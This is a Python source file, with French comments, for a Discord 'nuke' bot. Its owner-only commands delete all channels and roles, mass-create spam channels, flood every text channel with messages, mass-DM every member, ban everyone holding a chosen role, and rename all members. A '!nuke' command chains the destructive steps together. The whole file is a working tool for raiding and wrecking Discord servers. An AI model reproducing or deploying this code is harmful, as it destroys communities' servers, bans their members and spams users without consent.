import discord
from discord.ext import commands
import asyncio
import datetime
import pytz

intents = discord.Intents().all()
# ici pour changer le prefix 
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    if not bot.guilds:
        print("Le bot n'est connecté à aucun serveur Discord.")
        return

    print(f"Connecté au serveur Discord {bot.guilds[0].name} ({bot.guilds[0].id})")
    print(f"Bot : {bot.user.name} ({bot.user.id})")
    print(f"Membres : {sum(guild.member_count for guild in bot.guilds)}")
    print(f"Serveurs : {len(bot.guilds)}")

your_user_id = int(input("Veuillez entrer votre ID utilisateur : "))
bot_token = input("Veuillez entrer le token du bot : ")

bot.remove_command('help')

def is_your_user(ctx):
    return ctx.author.id == your_user_id

@bot.command()
@commands.check(is_your_user)
async def purge(ctx):
    """supprime tous les salon
       !purge   
    """
    for category in ctx.guild.categories:
        if category.name != "General":
            await category.delete()
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.VoiceChannel) or isinstance(channel, discord.TextChannel):
            if channel != ctx.channel:
                await channel.delete()
                
@purge.error
async def purge_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")

@bot.command()
@commands.check(is_your_user)
async def mass(ctx, num_channels: int, channel_name: str):
    """créer plein de salon
       !mass (nombre de channel) (nom des channel)   
    """
    parent_channel = ctx.channel
    for i in range(num_channels):
        await parent_channel.guild.create_text_channel(f"{channel_name} {i+1}", category=parent_channel.category, position=parent_channel.position + 1, topic=parent_channel.topic)

@mass.error
async def mass_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")

@bot.command()
@commands.check(is_your_user)
async def mss(ctx, num_messages: int, *, message: str):
    """Envoie des message avec un nombre presie et le message presie
       !mss (nombre de message) (message)   
    """
    text_channels = []
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            text_channels.append(channel)

    async def send_message(channel):
        for i in range(num_messages):
            await channel.send(f"{message}")

    tasks = [asyncio.create_task(send_message(channel)) for channel in text_channels]
    await asyncio.gather(*tasks)

@mss.error
async def mss_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")


@bot.command()
@commands.check(is_your_user)
async def nuke(ctx, num_channels: int, channel_name: str, num_messages: int, *, message: str):
    """fais tout, supprimer tous les channel, créer plein de salon et envoie plein de message
       !nuke (numbre de channel) (nom des channel) (nombre de message) (message)
    """
    await purge(ctx)
    await mass(ctx, num_channels, channel_name)
    await asyncio.sleep(0)
    await mss(ctx, num_messages=num_messages, message=message)
    
@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")

@bot.command()
@commands.check(is_your_user)
async def dm(ctx, *, message: str):
    """Envoie un message privé à tous les membres du serveur"""
    total_members = len(ctx.guild.members)
    success_count = 0

    tasks = []
    for member in ctx.guild.members:
        tasks.append(send_dm(message, member))
    results = await asyncio.gather(*tasks)

    for result in results:
        if result:
            success_count += 1

    await ctx.send(f"Le message a été envoyé avec succès à {success_count}/{total_members} membres du serveur !")

async def send_dm(message, member):
    if member.bot:
        return False
    try:
        dm_channel = await member.create_dm()
        await asyncio.sleep(1)
        await dm_channel.send(f"{message}")
        return True
    except discord.Forbidden:
        return False
    
@dm.error
async def dm_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")
    
@bot.command()
@commands.check(is_your_user)
async def roles(ctx):
    """Supprime tous les roles
       !role     
    """
    guild = ctx.guild
    roles = guild.roles
    everyone_role = guild.default_role

    for role in roles:
        if role != everyone_role:
            await role.delete()
            
@roles.error
async def roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")

@bot.command(name='help')
async def show_help(ctx):
    """Affiche toutes les commandes disponibles"""
    commands_per_page = 10 
    total_pages = -(-len(bot.commands) // commands_per_page) 
    current_page = 1

    pages = []
    for i in range(total_pages):
        start_index = i * commands_per_page
        end_index = start_index + commands_per_page
        page_commands = list(bot.commands)[start_index:end_index]
        page_description = "\n".join([f"**!{command.name}** - {command.help}" for command in page_commands])
        page_embed = discord.Embed(title="Aide", description=page_description, color=0x00FF00)
        page_embed.set_thumbnail(url="https://i.imgur.com/BTl4SEP.png")
        page_embed.set_footer(text=f"Page {i+1}/{total_pages} - Bot créé par fr41tr42#9523")
        pages.append(page_embed)

    # Supprime les mentions dans le message de commande
    clean_content = ctx.message.clean_content

    message = await ctx.send(embed=pages[current_page-1])

    if total_pages > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

        def check(reaction, user):
            return user == ctx.message.author and str(reaction.emoji) in ["◀️", "▶️"]

        while True:
            try:
                reaction, user = await bot.wait_for("reaction_add", check=check)
                if str(reaction.emoji) == "▶️" and current_page < total_pages:
                    current_page += 1
                    await message.edit(embed=pages[current_page-1])
                    await message.remove_reaction(reaction, user)
                elif str(reaction.emoji) == "◀️" and current_page > 1:
                    current_page -= 1
                    await message.edit(embed=pages[current_page-1])
                    await message.remove_reaction(reaction, user)
                else:
                    await message.remove_reaction(reaction, user)
            except:
                break

@bot.command()
async def ping(ctx):
    """Affiche le ping du bot"""
    latency = bot.latency
    api_latency = round(bot.latency * 1000)
    created_at = ctx.message.created_at.astimezone(pytz.UTC).replace(tzinfo=None)
    message_latency = (datetime.datetime.utcnow() - created_at).total_seconds() * 1000
    embed = discord.Embed(title="Ping", color=discord.Color.blue())
    embed.add_field(name="Latence du bot", value=f"{round(latency * 1000)} ms")
    embed.add_field(name="Latence de l'API Discord", value=f"{api_latency} ms")
    embed.add_field(name="Latence du message", value=f"{round(message_latency)} ms")
    await ctx.send(embed=embed)
    
@bot.command(name='ban-role', aliases=['bans'])
@commands.check(is_your_user)
async def ban_role(ctx, role_name):
    """Ban tous les membre ayent le role choisie
       !ban-role everyone 
       ou
       !bans everyone
    """
    guild = ctx.guild

    role = discord.utils.get(guild.roles, name=role_name)

    if role is not None:
        await ctx.send(f"Bannissant tous les membres du rôle {role_name}...")
        for member in role.members:
            await member.ban()
        await role.delete()
        await ctx.send(f"Le rôle {role_name} a été banni, et tous ses membres ont été bannis.")
    else:
        await ctx.send(f"Impossible de trouver le rôle {role_name}.")
        
@ban_role.error
async def ban_role_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")
        
@bot.command()
@commands.check(is_your_user)
async def ps(ctx, role: discord.Role, new_nickname: str):
    """Change le pseudo de tous les membres ayant un certain rôle
       !ps everyone nouveau pseudo
    """
    count = 0
    for member in role.members:
        try:
            await member.edit(nick=new_nickname)
            count += 1
        except discord.Forbidden:
            pass
    await ctx.send(f"Le pseudo de {count} membre(s) ayant le rôle {role.name} a été changé en '{new_nickname}'")
    
@ps.error
async def ps_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("Vous n'êtes pas autorisé à exécuter cette commande.")

print("Lancement du bot...")
bot.run(bot_token)